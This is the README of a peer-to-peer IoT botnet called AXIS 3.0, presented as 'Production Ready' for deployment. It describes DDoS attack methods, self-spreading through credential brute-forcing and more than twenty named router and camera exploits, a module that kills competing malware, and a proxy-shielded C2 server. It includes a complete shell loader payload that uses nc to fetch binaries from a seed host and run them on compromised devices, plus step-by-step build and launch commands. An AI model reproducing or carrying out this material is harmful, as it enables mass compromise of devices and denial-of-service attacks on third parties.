# AXIS 3.0 P2P - Complete Documentation

## Overview

AXIS 3.0 P2P is a fully decentralized peer-to-peer botnet using **torrent-style binary distribution**. Every bot simultaneously executes DDoS attacks, self-replicates via 20+ exploit scanners, and **seeds ALL bot binaries** to newly infected devices — exactly like a BitTorrent swarm where every peer is a seeder.

### Key Design Principles

1. **Torrent-style P2P distribution**: Bots download ALL binaries from the P2P network via UDP 49153. Every bot is a seeder.
2. **DNS resolution on bots**: All L4 attacks (UDP, TCP, ICMP, amplification) resolve domains via 7 rotating DNS servers (1.1.1.1, 8.8.8.8, 8.8.4.4, 9.9.9.9, 1.0.0.1, etc.)
3. **URL-based L7 attacks**: L7 methods accept URLs directly - bots parse protocol, domain, path, and port automatically
4. **Integrated scanners**: C2 server includes ZMap-style fast port scanner + telnet bruter
5. **Auto-deployment**: Scan results feed to loader for binary download via P2P torrent swarm
6. **C2 joins via proxies**: C2 loads proxy lists from `proxies/` folder to inject commands while shielding its IP
7. **Auto-seed control**: C2 stops seeding binaries at 200 bots, resumes below 200

## Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│                      BOT INSTANCE                                 │
│                                                                    │
│  Parent Process                                                    │
│  ├─ Attack System (24 methods: L4, L7, AMP, TCP, ICMP, GRE)      │
│  ├─ P2P Command Network (UDP 49152)                               │
│  ├─ P2P File Seeder (UDP 49153) ← TORRENT-STYLE                  │
│  │   └─ Serves ALL 13 axis.* binaries to peers                   │
│  ├─ Self-Replication Engine                                       │
│  │   ├─ Telnet Scanner (port 23, 90+ credentials)                │
│  │   ├─ SSH Scanner (port 22)                                     │
│  │   └─ 20+ Exploit Scanners (routers, IoT, cameras)             │
│  ├─ C2/CNC Connection (optional, TLS port 443)
│  └─ Killer Module (anti-competing malware)                        │
│                                                                    │
│  Every bot is BOTH a seeder AND an attacker                       │
└──────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────┐
│                    C&C SERVER                                      │
│                                                                    │
│  ├─ TLS Bot Listener (port 443) - traditional bots                │
│  ├─ Admin Panel (port 6969, TLS)                                  │
│  ├─ REST API (port 3779)                                          │
│  └─ P2P Injector                                                  │
│      ├─ Loads proxy lists from proxies/ folder (shields CNC IP) │
│      ├─ Sends attack commands through P2P                        │
│      └─ Auto-seed control:                                        │
│          • Bots >= 200 → STOP seeding binaries                   │
│          • Bots < 200  → RESUME seeding binaries                 │
└──────────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────────┐
│                    SEEDER SERVICE (Go)                             │
│                                                                    │
│  Standalone tool to continuously seed attack commands            │
│  into the P2P network (torrent-style propagation)                │
│                                                                    │
│  Usage: ./seeder_server <method> <target> <duration>             │
└──────────────────────────────────────────────────────────────────┘
```

## Components

### 1. Bot (`bot/`)

**Source Files:**
| File | Purpose |
|------|---------|
| `main.c` | Entry point, P2P init, selfrep init, CNC handler |
| `attack.c/h` | 24 attack implementations |
| `p2p.c/h` | P2P UDP command protocol + peer discovery |
| `p2pfile.c/h` | **Torrent-style binary seeding** (every bot is a seeder) |
| `selfrep.c/h` | **Integrated self-replication** (20+ scanners) |
| `killer.c/h` | Anti-malware competitor killer |
| `checksum.c/h` | IP/ICMP/TCP checksums |
| `resolv.c/h` | DNS resolution |
| `rand.c/h` | PRNG |
| `table.c/h` | Encrypted string table |
| `util.c/h` | Utilities |
| `protocol.h` | Network protocol structures |
| `includes.h` | Common includes |
| `config.h` | Build configuration |

**Architectures (13):** arm, arm5, arm6, arm7, mips, mpsl, x86, x86_64, ppc, spc, m68k, sh4, arc

**Configuration (`bot/config.h`):**
```c
#define CNC_ADDR "YOUR_VPS_IP"
#define P2P_PORT 49152
#define P2P_FILE_PORT 49153
#define P2P_MAX_PEERS 256
#define P2P_SEEDS ""              // Empty = broadcast auto-discovery
#define SCAN_CB_PORT 9555
#define SINGLE_INSTANCE_PORT 23455
#define KILLER
#define SELFREP                   // Self-replication enabled
```

### 2. Torrent-Style P2P Distribution

**How it works:**
1. Bot starts up, discovers peers via seeds or broadcast
2. Downloads ALL 13 `axis.*` binaries from any peer (UDP 49153)
3. Stores binaries in memory AND on disk (`/tmp/axis.*`)
4. Becomes a **seeder** — serves binaries to other requesting bots
5. Starts self-replication scanners to find new devices
6. Every new infection downloads binaries from the P2P swarm

**File Protocol (UDP 49153):**
```
Request:  [0x20][chunk_id_low][chunk_id_high][filename (31 bytes)]
Response: [0x21][chunk_id_low][chunk_len_low][chunk_len_high][data...]
```

Chunk size: 4096 bytes. Max 256 chunks per binary (1MB max).

**Auto-redownload:** Every 5 minutes, bots check if they're missing any binaries and re-download from peers.

### 3. Self-Replication (Integrated into Every Bot)

All scanners from `scanners-exploits/` are now built into `bot/selfrep.c`:

**Telnet Scanner:** Port 23, 90+ credentials
**SSH Scanner:** Port 22, 16+ credentials
**Exploit Scanners (20+):**
- Huawei SOAP RCE (port 37777)
- Zyxel CGI command injection
- DVR/NVR camera backdoor
- Zhone ONT/OLT exploit
- Fiber/GPON exploit (GPON form diag)
- ADB UPnP RCE (port 5555)
- D-Link SOAP/command injection
- HiLink exploit
- XiongMai camera (port 34567)
- ASUS router exploit
- JAWS web server format string
- Linksys WRT command injection
- Linksys port 8080
- HNAP1 SOAP RCE
- Netlink router exploit
- TR-064 SOAP RCE
- Realtek SDK UPnP exploit
- ThinkPHP framework RCE
- Telnet auth bypass
- GPON scanner
- GoAhead web server exploit

**Scanner rotation:** Every 60 seconds, the bot rotates between telnet, SSH, and exploit scanning modes.

**Infection reporting:** Successful infections are reported to the scan callback listener (UDP `SCAN_CB_PORT`) in format: `IP(4) + port(2) + userlen(1) + user + passlen(1) + pass`.

### 4. C&C Server (`cnc/`)

**DNS Resolution for L7 Attacks:**
L7 HTTP attacks (`tls`, `http`, `cf`, `axis-l7`) now resolve target domains directly on the bot using built-in DNS resolution. No need to specify `domain=x` - just pass the URL:

```
tls https://example.com/path 300
http http://target.com/api 300
axis-l7 https://example.com/login 600
```

The bot automatically:
1. Parses the URL for protocol (HTTP/HTTPS), domain, path, and port
2. Resolves the domain via DNS (using Cloudflare 1.1.1.1, Google 8.8.8.8, etc.)
3. Connects to all resolved IPs with proper port (80 for HTTP, 443 for HTTPS)

**DNS Servers (built into bot):**
- `1.1.1.1` - Cloudflare Primary
- `8.8.8.8` - Google Primary
- `8.8.4.4` - Google Secondary
- `9.9.9.9` - Quad9
- `1.0.0.1` - Cloudflare Secondary
- Plus fallback servers

**Proxy List-Based Command Injection:**
The CNC doesn't send commands directly to bots. Instead, it loads proxy lists from the `proxies/` folder (http.txt, https.txt, socks4.txt, socks5.txt) and uses them to inject attack commands into the P2P network while shielding its real IP address.

```go
// In admin.go - proxies loaded from proxies/ folder
proxies := LoadProxies("proxies/http.txt", "proxies/socks5.txt")
injector := NewP2PInjector(p2pSeeds, proxies)
injector.SendAttack(buf)
```

**Auto-Seeding Control:**
```go
const SEED_THRESHOLD = 200  // Stop seeding when bots >= 200
const SEED_RESUME = 200     // Resume seeding when bots < 200
```

When an attack is launched:
- If bot count >= 200: Attack commands only (no binary seeding)
- If bot count < 200: Attack commands + binary seeding active

**Torrent-Style Peer Discovery:**
The CNC can auto-discover peers like torrent DHT:
```go
discovered := injector.DiscoverPeers()
// Sends PING to seeds, collects PONG responses with peer lists
```

### 5. Seeder Service (`seeder/`)

**Written in Go.** Standalone tool for continuously seeding attack commands into the P2P network.

**Usage:**
```bash
./seeder_server axis-l7 1.2.3.4 300
# Continuously re-seeds every 10 seconds
```

**Methods supported:** All 24 attack methods

### 6. Loader (`loader/`)

**Updated for torrent-style distribution.** Instead of serving binaries via HTTP, the loader sends P2P download payloads to infected devices.

**P2P Download Payload:**
```bash
cd /tmp;
for arch in arm arm5 arm6 arm7 mips mpsl x86 x86_64 ppc spc m68k sh4 arc; do
    rm -f axis.$arch;
    chunk=0;
    while true; do
        printf '\x20\x$(printf "%02x" $((chunk % 256)))\x$(printf "%02x" $((chunk / 256)))$arch' | \
        nc -u -w2 SEED_IP 49153 >> axis.$arch 2>/dev/null;
        chunk=$((chunk + 1));
        if [ $chunk -gt 256 ]; then break; fi;
    done;
    chmod +x axis.$arch 2>/dev/null;
done;
for arch in arm arm5 arm6 arm7 mips mpsl x86 x86_64 ppc spc m68k sh4 arc; do
    test -s axis.$arch && ./axis.$arch &
done
```

### 7. Python Loader (`loader_py/`)

Alternative Python-based loader. Same P2P torrent-style distribution.

### 8. Scan Listener (`scanListen.go`)

Receives infection reports from bots. Outputs to `telnet.txt`.

### 9. P2P Controller (`p2p_ctrl.py`)

Python CLI for sending attack commands via P2P.

## Build Instructions

### Option A: Docker (Recommended - Fully Self-Contained)
```bash
# Build the Docker image with all cross-compilers included
docker build -t axis3-builder .

# Build everything inside Docker
docker run -v $(pwd):/workspace axis3-builder ./build.sh
```

### Option B: System-Wide Cross-Compilers
```bash
# Install all 13 cross-compilers automatically
chmod +x setup_cross_compilers.sh
./setup_cross_compilers.sh

# Then build
chmod +x build.sh build_relay.sh build_scanners.sh
./build.sh           # Bots (13 archs), C&C, loader, DLRs, Seeder
./build_relay.sh     # P2P relay server
```

**Output:**
```
bins/axis.*          # Bot binaries (13 architectures, with selfrep)
bins/dlr.*           # Downloaders
cnc_server           # C&C server
seeder_server        # P2P attack command seeder
relay_server         # P2P relay server
loader               # Telnet loader
```

## Deployment

### 1. Configure Seed Peers

Edit these files:
- `bot/config.h` → `P2P_SEEDS "VPS1:49152,VPS2:49152"` (or leave empty for broadcast)
- `cnc/admin.go` → `p2pSeeds` and `proxies`
- `relay/config.go` → `seedPeers`

### 2. Start C&C Server
```bash
sudo ./cnc_server
# Load proxy lists from proxies/ folder to shield CNC IP
```

### 3. Start Seeder (Optional)
```bash
./seeder_server axis-l7 target.com 300
# Continuously seeds attack commands every 10 seconds
```

### 4. Initial Infection
```bash
./loader
# Feed: IP:PORT username:password [arch]
# Infected devices download binaries via P2P torrent from existing bots
```

### 5. Launch Attacks
```bash
# Via C&C admin panel (port 6969)
openssl s_client -connect CNC_IP:6969 -quiet

# Via seeder
./seeder_server axis-l7 target.com 300

# Via P2P controller
python3 p2p_ctrl.py axis-l7 target.com 300
```

## Monitoring

```bash
# P2P activity
tcpdump -i any -n udp port 49152  # Commands
tcpdump -i any -n udp port 49153  # File transfers

# Bot processes
ps aux | grep axis

# Scan results
tail -f telnet.txt

# CNC logs
cat logs/commands.txt
cat logs/logins.txt
```

## Ports Summary

| Port | Protocol | Purpose |
|------|----------|---------|
| 443 | TCP/TLS | C&C bot connections |
| 6969 | TCP/TLS | Admin panel / Relay |
| 3779 | TCP/HTTP | REST API |
| 49152 | UDP | P2P command propagation |
| 49153 | UDP | P2P binary seeding (torrent-style) |
| 9555 | TCP | Scan result callback |
| 23455 | TCP | Single instance lock |

## Security

**Before deployment:**
1. Change default passwords (`admin123` in `cnc/database.json` and `relay/config.go`)
2. Set real seed peer IPs in all config files
3. Load proxy lists into `proxies/` folder (http.txt, socks4.txt, etc.) to shield CNC IP
4. Set `CNC_ADDR` in `bot/config.h`

---

**Version:** 2.0 P2P Torrent Edition
**Last Updated:** April 2026
**Status:** Production Ready
